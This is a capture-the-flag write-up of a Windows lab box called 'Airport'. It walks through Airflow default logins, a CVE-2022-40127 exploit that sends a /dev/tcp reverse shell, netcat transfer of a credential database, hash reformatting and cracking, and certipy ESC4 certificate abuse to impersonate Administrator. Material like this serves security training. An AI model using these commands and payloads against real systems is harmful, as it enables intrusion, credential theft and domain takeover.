---
layout: writeup
category: Airport
chall_description: https://mega.nz/file/0eFRlDZa#bYBhnU7_6rjYwARGVZF2Q1OWXx_8sVs4_TcagdIDbeQ
points: 0
solves: 0
tags: Airflow ActiveDirectory ADCS 
date: 2024-06-12
comments: true
---

## Introduction

**Airport** is an easy difficulty windows box that features the exploitation of `Airflow` to achieve RCE. This will allow us to get a shell on a Linux end (WSL) in which we'll find a database file that stores credentials. After modifying the obtained hash to be able to crack it, we'll connect using those credentials via WinRM to read the user flag. Seeing that ADCS is enabled and has a custom certificate (Airport-CA) on the system, we'll begin to enumerate with `certipy`, which will lead us to the exploitation of the `ESC4` vulnerability.
This box was a box that got provisionally accepted by HackTheBox, but at the moment of testing it, the CPU was just too high. I rebuilt the box on Windows Server with no luck, but you guys have the link to download it from mega if you want to try it :)

# Writeup

## Enumeration

### Ports

 As always we start with the `nmap`:

<pre 
  class="command-line" 
  data-prompt="ruycr4ft@hacky $" 
  data-output="4"
><code class="language-bash">
nmap -p- -sS --open --min-rate 5000 -vvv -Pn -n 10.10.11.136
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94 ( https://nmap.org ) at 2024-06-12 17:03 CEST
Initiating ARP Ping Scan at 17:03
Scanning 10.10.11.136 [1 port]
Completed ARP Ping Scan at 17:03, 0.07s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 17:03
Scanning 10.10.11.136 [65535 ports]
Discovered open port 135/tcp on 10.10.11.136
Discovered open port 53/tcp on 10.10.11.136
Discovered open port 139/tcp on 10.10.11.136
Discovered open port 8080/tcp on 10.10.11.136
Discovered open port 445/tcp on 10.10.11.136
Discovered open port 49666/tcp on 10.10.11.136
Discovered open port 464/tcp on 10.10.11.136
Discovered open port 49693/tcp on 10.10.11.136
Discovered open port 49667/tcp on 10.10.11.136
Discovered open port 49724/tcp on 10.10.11.136
Discovered open port 49696/tcp on 10.10.11.136
Discovered open port 8793/tcp on 10.10.11.136
Discovered open port 3269/tcp on 10.10.11.136
Discovered open port 389/tcp on 10.10.11.136
Discovered open port 49664/tcp on 10.10.11.136
Discovered open port 49709/tcp on 10.10.11.136
Discovered open port 88/tcp on 10.10.11.136
Discovered open port 9389/tcp on 10.10.11.136
Discovered open port 49665/tcp on 10.10.11.136
Discovered open port 49699/tcp on 10.10.11.136
Discovered open port 636/tcp on 10.10.11.136
Discovered open port 47001/tcp on 10.10.11.136
Discovered open port 3268/tcp on 10.10.11.136
Discovered open port 49694/tcp on 10.10.11.136
Discovered open port 593/tcp on 10.10.11.136
Discovered open port 5985/tcp on 10.10.11.136
Completed SYN Stealth Scan at 17:03, 26.38s elapsed (65535 total ports)
Nmap scan report for 10.10.11.136
Host is up, received arp-response (0.0011s latency).
Scanned at 2024-06-12 17:03:20 CEST for 27s
Not shown: 65509 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 128
88/tcp    open  kerberos-sec     syn-ack ttl 128
135/tcp   open  msrpc            syn-ack ttl 128
139/tcp   open  netbios-ssn      syn-ack ttl 128
389/tcp   open  ldap             syn-ack ttl 128
445/tcp   open  microsoft-ds     syn-ack ttl 128
464/tcp   open  kpasswd5         syn-ack ttl 128
593/tcp   open  http-rpc-epmap   syn-ack ttl 128
636/tcp   open  ldapssl          syn-ack ttl 128
3268/tcp  open  globalcatLDAP    syn-ack ttl 128
3269/tcp  open  globalcatLDAPssl syn-ack ttl 128
5985/tcp  open  wsman            syn-ack ttl 128
8080/tcp  open  http-proxy       syn-ack ttl 128
8793/tcp  open  acd-pm           syn-ack ttl 128
9389/tcp  open  adws             syn-ack ttl 128
47001/tcp open  winrm            syn-ack ttl 128
49664/tcp open  unknown          syn-ack ttl 128
49665/tcp open  unknown          syn-ack ttl 128
49666/tcp open  unknown          syn-ack ttl 128
49667/tcp open  unknown          syn-ack ttl 128
49693/tcp open  unknown          syn-ack ttl 128
49694/tcp open  unknown          syn-ack ttl 128
49696/tcp open  unknown          syn-ack ttl 128
49699/tcp open  unknown          syn-ack ttl 128
49709/tcp open  unknown          syn-ack ttl 128
49724/tcp open  unknown          syn-ack ttl 128
MAC Address: 00:0C:29:AB:84:CA (VMware)

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 26.53 seconds
           Raw packets sent: 131056 (5.766MB) | Rcvd: 38 (1.656KB)</code>
</pre> 


Here we'll notice a bunch of AD common ports, however we'll look at port 8080 closely.

### HTTP - 8080

Right after hitting http://airport.htb:8080/ we can see an interesting website that seems to host the Airflow software. 

![1](https://github.com/ruycr4ft/ruycr4ft.github.io/blob/master/assets/CTFs/Airport/1.png)

Searching for the default credentials for airflow, we will eventually get to [this page](https://stackoverflow.com/questions/66160780/first-time-login-to-apache-airflow-asks-for-username-and-password-what-is-the-u) that says the following: 

![2](https://github.com/ruycr4ft/ruycr4ft.github.io/blob/master/assets/CTFs/Airport/2.png)

If we try to enter these credentials into the web, we can notice we get logged in:

![3](https://github.com/ruycr4ft/ruycr4ft.github.io/blob/master/assets/CTFs/Airport/3.png)

## Shell - matthew (WSL)

Scrolling down on the website we can notice the version used by the server:

![4](https://github.com/ruycr4ft/ruycr4ft.github.io/blob/master/assets/CTFs/Airport/4.png)

And by looking for CVEs, we'll easily get to [this one](https://github.com/jakabakos/CVE-2022-40127-Airflow-RCE), which will get us remote command execution.

![image-20240329165047448](https://github.com/ruycr4ft/ruycr4ft.github.io/blob/master/assets/CTFs/Airport/5.png)

First of all we will clone the repository into our attacker box with the following command:

<pre 
  class="command-line" 
  data-prompt="ruycr4ft@hacky $" 
  data-output="4"
><code class="language-bash">git clone https://github.com/jakabakos/CVE-2022-40127-Airflow-RCE.git
Clonando en 'CVE-2022-40127-Airflow-RCE'...
remote: Enumerating objects: 27, done.
remote: Counting objects: 100% (27/27), done.
remote: Compressing objects: 100% (24/24), done.
remote: Total 27 (delta 6), reused 6 (delta 0), pack-reused 0
Recibiendo objetos: 100% (27/27), 5.84 MiB | 1.16 MiB/s, listo.
Resolviendo deltas: 100% (6/6), listo.
cd CVE-2022-40127-Airflow-RCE</code>
</pre> 

And after that we will trigger the exploit to send a reverse shell to our IP and port 1234, for example:

<pre 
  class="command-line" 
  data-prompt="ruycr4ft@hacky $" 
  data-output="4"
><code class="language-bash">python3 exploit.py -u airflow -p airflow -url http://10.10.11.136:8080 -a -host 10.10.11.129 -port 1433
[+] CSRF token found.
Login was successful. Captured session cookie: b03d4da3-3514-4ae0-ac1c-1e9f700f82d1.RnaXA4_2O943f04gmkhr1nq1ZK8
[+] Airflow version found: 2.3.4
[+] Version is vulnerable.
[+] Yay! The example_bash_operator example DAG exists.
[+] Proceeding with the exploit. Trying to upload reverse shell.
[+] Using the following payload: ";sh -i >& /dev/tcp/10.10.11.129/1433 0>&1;""
[+] Exploit seems to work. Wait for a connection on port 1433.</code>
</pre>

About 20 seconds later, we'll get a shell as Matthew:

<pre 
  class="command-line" 
  data-prompt="ruycr4ft@hacky $" 
  data-output="4"
><code class="language-bash">nc -lvnp 1433
listening on [any] 1433 ...
connect to [10.10.11.129] from (UNKNOWN) [10.10.11.136] 49813
sh: 0: can't access tty; job control turned off
matthew@DC01$</code>
</pre> 

## Shell - matthew (Windows Server)

This hostname matches with the Windows end:

<pre 
  class="command-line" 
  data-prompt="ruycr4ft@hacky $" 
  data-output="4"
><code class="language-bash">cme smb 10.10.11.136
SMB         10.10.11.136    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:airport.htb) (signing:True) (SMBv1:False)</code>
</pre> 

This is, for sure, that the Linux server is configured in WSL. Thus, players will immediately change directory to `/mnt/c` in order to read the flags. However, I've protected this to happen:

<pre 
  class="command-line" 
  data-prompt="matthew@DC01 $" 
  data-output="4"
><code class="language-bash">cd /mnt/c
ls
ls -la
drwxrwxrwx 1 root root 4096 Apr 10 12:15 .
drwxr-xr-x 1 root root 4096 Apr 10 12:15 ..</code>
</pre> 

Going back into Matthew's home directory, we can notice the `airflow` folder, which contains a sqlite database file:

![image-20240329170637616](C:\Users\Ruy\AppData\Roaming\Typora\typora-user-images\image-20240329170637616.png)

With netcat we can transfer this file to our attacker box:

```bash
# Attacker box
nc -l -p 9001 > airflow.db 
# DC01
nc -w 3 192.168.0.117 9001 < airflow.db
```

After that we'll use the `sqlite3` command to read the database contents:

```sqlite
select * from ab_user;
```

![image-20240329170952408](C:\Users\Ruy\AppData\Roaming\Typora\typora-user-images\image-20240329170952408.png)

However this hash is not well formatted in order to crack it:

```bash
# We put the password into a file called test
echo "5ac0eea8a8a1d13119a046d7a833ff18a7848dc4bc987b95804144b21e8f304e" > test
# Then we grab the salt and we encode it with base64
echo -n "Qg7UYbEbeBqqodEz" | base64
# After that we "unhex" the hashed password and encode it too
xxd -ps -r test | base64
# Finally, we format our hash like this: sha256:[itinerations]:[b64salt]:[b64hash]
echo -n "sha256:260000:UWc3VVliRWJlQnFxb2RFeg==:WsDuqKih0TEZoEbXqDP/GKeEjcS8mHuVgEFEsh6PME4=" > matthew.hash
```

Doing this, we are now able to crack it easily with the tool `hashcat`:

```bash
hashcat -m 10900 matthew.hash /usr/share/wordlists/rockyou.txt --show
```

![image-20240329171532939](C:\Users\Ruy\AppData\Roaming\Typora\typora-user-images\image-20240329171532939.png)

We can now use this password to connect via WinRM to the Windows end to read the user flag:

![image-20240329171657293](C:\Users\Ruy\AppData\Roaming\Typora\typora-user-images\image-20240329171657293.png)

## Privilege escalation

At this point of the box we can try to look for interesting privileges, but we notice we don't have any interesting of them. But, if we try to see if ADCS is installed we will notice that, indeed, is installed:

```powershell
(Get-WindowsFeature -Name ADCS-Cert-Authority -ErrorAction SilentlyContinue).Installed
```

![image-20240329171927486](C:\Users\Ruy\AppData\Roaming\Typora\typora-user-images\image-20240329171927486.png)

Knowing this, we'll start enumerating with the `certipy` tool:

```bash
certipy find -u matthew@airport.htb -p 'airforce1' -dc-ip 192.168.0.102 -stdout
```

![image-20240329172252135](C:\Users\Ruy\AppData\Roaming\Typora\typora-user-images\image-20240329172252135.png)

Down here we can notice that this tool is pointing to the ESC4, which will allow us to get an administrator hash to get a shell as it.

```bash
certipy template -u matthew@airport.htb -p 'airforce1' -template Airport-CA -save-old -dc-ip 192.168.0.102
```

![image-20240329172915331](C:\Users\Ruy\AppData\Roaming\Typora\typora-user-images\image-20240329172915331.png)

After that, we will request a PFX file, trying to impersonate the Administrator account:

```bash
certipy req -u matthew@airport.htb -p 'airforce1' -ca airport-DC01-CA -target DC01.airport.htb -template Airport-CA -upn administrator@airport.htb -dc-ip 192.168.0.102
```

![image-20240329173051657](C:\Users\Ruy\AppData\Roaming\Typora\typora-user-images\image-20240329173051657.png)

To finish this, we'll use the auth command to get the NT hash for administrator:

```bash
certipy auth -pfx administrator.pfx -dc-ip 192.168.0.102
```

![image-20240329173146266](C:\Users\Ruy\AppData\Roaming\Typora\typora-user-images\image-20240329173146266.png)

Finally, we can use this hash with the tool `evil-winrm` to get an interactive shell as administrator and to be able to read root flag:

![image-20240329173349209](C:\Users\Ruy\AppData\Roaming\Typora\typora-user-images\image-20240329173349209.png)

That was the Airport box! Hope you liked it!
